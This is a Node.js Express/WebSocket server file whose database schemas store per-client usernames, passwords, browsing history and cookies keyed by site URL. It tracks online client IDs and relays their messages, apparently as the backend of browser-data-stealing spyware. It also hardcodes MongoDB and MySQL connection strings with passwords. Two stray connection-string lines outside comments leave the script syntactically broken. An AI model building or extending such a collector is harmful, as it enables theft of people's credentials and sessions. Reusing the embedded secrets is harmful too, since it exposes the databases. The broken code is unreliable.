'use strict';
//taskkill /F /IM node.exe
const express = require('express');
const SocketServer = require('ws').Server;
const path = require('path');
//var mysql = require('mysql');
//var mongodb = require('mongodb');
//var MongoClient = mongodb.MongoClient;
var uri = 'mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j';
var mongoose = require ("mongoose");

const PORT = process.env.PORT || 3000;
const INDEX = path.join(__dirname, 'index.html');
const WebSocket = require('ws');

const server = express()
  .use((req, res) => res.sendFile(INDEX) )
  .listen(PORT, () => console.log(`Listening on ${ PORT }`));

var app = express();
const wss = new SocketServer({ server });

var clientStatus = new mongoose.Schema({
    id: {type: Number},
    status: { type: String}
  });
var clientUsername = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    username: {type: String}
  });
var clientPassword = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    password: {type: String}
  });
var clientHistory = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    history: {type: [String]}
  });
var clientCookies = new mongoose.Schema({
    id: {type: Number},
    url: { type: String},
    name: {type: String},
    value: {type: String}
  });


mysql://b35b454793036b:91686762@us-cdbr-iron-east-01.cleardb.net/heroku_9059f11db120273?reconnect=true
mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j
/*
var mySQL_config = {
  host     : 'us-cdbr-iron-east-01.cleardb.net',
  user     : 'b35b454793036b',
  password : '91686762',
  database : 'heroku_9059f11db120273'
};
var connection;
function handleDisconnect() {
    console.log('1. connecting to db:');
    connection = mysql.createConnection(mongoDB_config); // Recreate the connection, since
													// the old one cannot be reused.

    connection.connect(function(err) {              	// The server is either down
        if (err) {                                     // or restarting (takes a while sometimes).
            console.log('2. error when connecting to db:', err);
            setTimeout(handleDisconnect, 1000); // We introduce a delay before attempting to reconnect,
        }                                     	// to avoid a hot loop, and to allow our node script to
    });                                     	// process asynchronous requests in the meantime.
    											// If you're also serving http, display a 503 error.
    connection.on('error', function(err) {
        console.log('3. db error');
        if (err.code === 'PROTOCOL_CONNECTION_LOST') { 	// Connection to the MySQL server is usually
            handleDisconnect();                      	// lost due to either server restart, or a
        } else {                                      	// connnection idle timeout (the wait_timeout
            throw err;                                  // server variable configures this)
        }
    });
}
*/
//handleDisconnect();
/*
MongoClient.connect(url, function (err, db) {
    if (err) {
      console.log('Unable to connect to the mongoDB server. Error:', err);
    } else {
      console.log('Connection established to', url);
  
      // do some work here with the database.
  
      //Close connection
      db.close();
    }
  });
  */
 mongoose.connect(uri, function (err, res) {
    if (err) {
    console.log ('ERROR connecting to: ' + uri + '. ' + err);
    } else {
    console.log ('Succeeded connected to: ' + uri);
    }
  });

var onlineClientsIDS = [];

wss.on('connection', function connection(ws) {
    
    console.log('Client connected');
    ws.on('message', function incoming(message) {

        console.log('received: %s', message);
        //ws.send(message);
        try{
        var data = JSON.parse(message);
        } catch(e){//if data isint proper format
            console.log('wrong format detected')
            return;
        }
        console.log(message);
        ws.id = data.id;
        if (onlineClientsIDS.indexOf(ws.id) === -1) {//checks to see if client is on online list, if not add it to lsit
            onlineClientsIDS.push(ws.id);
            var userStatus = mongoose.model('Client status', clientStatus);
            var newUser = new userStatus ({
                id: ws.id,
                status : 'online'
              });
            newUser.save(function (err) {if (err) console.log ('Error on save!')});
        }
        else
            console.log("id is already online");

        var type = data.type;
        /*//RECIEVING DATA
        if (type == 'history')//history list

        if (type == 'cookie')//cookie

        if (type == 'username')//username

        if (type == 'password')//password
*/

        //SENDING DATA

        wss.clients.forEach(function each(client) {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        });


    });

    ws.on('close', function (){ 
        console.log('Client disconnected')});
        var index = onlineClientsIDS.indexOf(ws.id);
        if (index > -1) {
            onlineClientsIDS.splice(index, 1);
        }
        
            
});
